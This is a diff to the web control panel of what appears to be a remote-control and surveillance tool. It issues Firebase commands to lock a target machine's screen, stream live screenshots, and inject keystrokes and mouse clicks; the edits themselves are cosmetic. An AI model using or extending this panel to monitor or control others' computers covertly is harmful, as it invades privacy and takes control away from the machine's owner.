@@ -9,9 +9,32 @@
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&display=swap');
-        body { font-family: 'Space Grotesk', sans-serif; background: #020617; }
+        body { font-family: 'Space Grotesk', sans-serif; background: #020617; overflow-x: hidden; }
         .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.05); }
-        #viewport-container img { user-drag: none; -webkit-user-drag: none; }
+        
+        /* Custom Hand Cursor for the Viewport */
+        #live-img { 
+            cursor: url('https://cur.cursors-4u.net/symbols/sym-1/sym46.cur'), pointer;
+            user-drag: none; 
+            -webkit-user-drag: none; 
+        }
+
+        /* Click Ripple Effect */
+        .click-ripple {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: rgba(59, 130, 246, 0.5);
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            animation: ripple 0.6s linear;
+        }
+
+        @keyframes ripple {
+            from { transform: translate(-50%, -50%) scale(0); opacity: 1; }
+            to { transform: translate(-50%, -50%) scale(4); opacity: 0; }
+        }
     </style>
 </head>
 <body class="min-h-screen text-slate-200 p-4 md:p-8">
@@ -33,13 +56,13 @@
 
                 <!-- Command Buttons -->
                 <div class="space-y-2 mb-6">
-                    <p class="text-[10px] text-slate-500 uppercase font-bold px-1">System State</p>
+                    <p class="text-[10px] text-slate-500 uppercase font-bold px-1 text-center">System State</p>
                     <button onclick="setDb('overlay_active', true)" id="lock-btn" class="w-full py-3 bg-red-600 hover:bg-red-700 rounded-lg font-bold text-sm transition-all active:scale-95">LOCK SYSTEM</button>
                     <button onclick="setDb('overlay_active', false)" class="w-full py-3 bg-slate-800 hover:bg-slate-700 rounded-lg text-sm text-slate-400 transition-all active:scale-95">BYPASS</button>
                 </div>
 
                 <div class="space-y-2 mb-6">
-                    <p class="text-[10px] text-slate-500 uppercase font-bold px-1">Surveillance</p>
+                    <p class="text-[10px] text-slate-500 uppercase font-bold px-1 text-center">Surveillance</p>
                     <div class="flex gap-2">
                         <button onclick="setDb('stream_active', true)" id="start-stream-btn" class="flex-1 py-3 bg-emerald-600 hover:bg-emerald-700 rounded-lg text-xs font-bold transition-all active:scale-95">START LIVE</button>
                         <button onclick="setDb('stream_active', false)" id="stop-stream-btn" class="flex-1 py-3 bg-slate-800 hover:bg-slate-700 rounded-lg text-xs transition-all active:scale-95">STOP</button>
@@ -48,18 +71,16 @@
 
                 <!-- Typing Control -->
                 <div class="space-y-2">
-                    <p class="text-[10px] text-slate-500 uppercase font-bold px-1">Remote Typing</p>
+                    <p class="text-[10px] text-slate-500 uppercase font-bold px-1 text-center">Remote Input</p>
                     <div class="flex flex-col gap-2">
                         <input type="text" id="type-input" placeholder="Type here..." class="w-full bg-black/40 border border-white/10 rounded-lg px-3 py-2 text-xs focus:outline-none focus:border-blue-500 text-white">
                         <div class="flex gap-2">
-                            <button onclick="sendText()" class="flex-1 bg-blue-600 hover:bg-blue-700 py-2 rounded-lg text-xs font-bold uppercase transition-all active:scale-95">Send Text</button>
+                            <button onclick="sendText()" class="flex-1 bg-blue-600 hover:bg-blue-700 py-2 rounded-lg text-xs font-bold uppercase transition-all active:scale-95">Send</button>
                             <button onclick="sendSpecialKey('enter')" class="flex-1 bg-slate-700 hover:bg-slate-600 py-2 rounded-lg text-xs font-bold uppercase transition-all active:scale-95 flex items-center justify-center gap-1">
-                                <svg xmlns="http://www.w3.org/2000/svg" class="h-3 w-3" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h6a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd" /></svg>
-                                Enter
+                                Enter ↵
                             </button>
                         </div>
                     </div>
-                    <p class="text-[8px] text-slate-600 italic px-1">Press enter on keyboard to send text quickly</p>
                 </div>
             </div>
         </div>
@@ -75,7 +96,7 @@
                     <span id="timestamp" class="text-[10px] font-mono opacity-40">--:--:--</span>
                 </div>
                 
-                <div id="viewport-container" class="relative flex-1 bg-black rounded-2xl overflow-hidden cursor-crosshair border border-white/10 group flex items-center justify-center">
+                <div id="viewport-container" class="relative flex-1 bg-black rounded-2xl overflow-hidden border border-white/10 group flex items-center justify-center">
                     <!-- Live Image Display -->
                     <img id="live-img" class="max-w-full max-h-full object-contain hidden pointer-events-auto" src="" onmousedown="remoteClick(event)" draggable="false" />
                     
@@ -107,18 +128,25 @@
             database.ref('system_settings/' + path).set(val); 
         }
 
-        // Improved Remote Clicking Logic (Handles image scaling/contain better)
+        // Remote Clicking Logic
         function remoteClick(e) {
             const img = document.getElementById('live-img');
             const rect = img.getBoundingClientRect();
             
-            // Calculate coordinates relative to the actual image element
-            // This ensures clicks land correctly even if image is scaled or letterboxed
+            // Calculate coordinates relative to the image
             const x = (e.clientX - rect.left) / rect.width;
             const y = (e.clientY - rect.top) / rect.height;
             
-            // Boundary check
             if (x >= 0 && x <= 1 && y >= 0 && y <= 1) {
+                // Show Ripple
+                const ripple = document.createElement('div');
+                ripple.className = 'click-ripple';
+                ripple.style.left = `${e.clientX - rect.left}px`;
+                ripple.style.top = `${e.clientY - rect.top}px`;
+                document.getElementById('viewport-container').appendChild(ripple);
+                setTimeout(() => ripple.remove(), 600);
+
+                // Send to Firebase
                 database.ref('system_settings/mouse_click').set({
                     x: x,
                     y: y,
@@ -127,29 +155,21 @@
             }
         }
 
-        // Remote Typing Logic
         function sendText() {
             const input = document.getElementById('type-input');
             const text = input.value;
             if(text) {
                 database.ref('system_settings/remote_typing').set(text);
                 input.value = "";
-                setTimeout(() => {
-                    database.ref('system_settings/remote_typing').set("");
-                }, 500);
+                setTimeout(() => { database.ref('system_settings/remote_typing').set(""); }, 500);
             }
         }
 
-        // Send Special Keys (Enter, etc.)
         function sendSpecialKey(key) {
-            // Using a special prefix or object to tell Python it's a keypress, not typing
             database.ref('system_settings/remote_typing').set(`{KEY:${key.toUpperCase()}}`);
-            setTimeout(() => {
-                database.ref('system_settings/remote_typing').set("");
-            }, 300);
+            setTimeout(() => { database.ref('system_settings/remote_typing').set(""); }, 500);
         }
 
-        // Enter key to send text
         document.getElementById('type-input').addEventListener('keypress', (e) => {
             if (e.key === 'Enter') sendText();
         });
@@ -176,13 +196,11 @@
             }
         });
 
-        // Stream Status UI
         database.ref('system_settings/stream_active').on('value', (s) => {
             const isStreaming = s.val();
             document.getElementById('live-indicator').classList.toggle('hidden', !isStreaming);
         });
 
-        // Screenshot Image Listener
         database.ref('system_settings/last_screenshot').on('value', (s) => {
             const b64 = s.val();
             const img = document.getElementById('live-img');
@@ -191,7 +209,7 @@
                 img.src = b64;
                 img.classList.remove('hidden');
                 loader.classList.add('hidden');
-                document.getElementById('timestamp').innerText = "LIVE FEED | " + new Date().toLocaleTimeString();
+                document.getElementById('timestamp').innerText = "LIVE | " + new Date().toLocaleTimeString();
             }
         });
     </script>
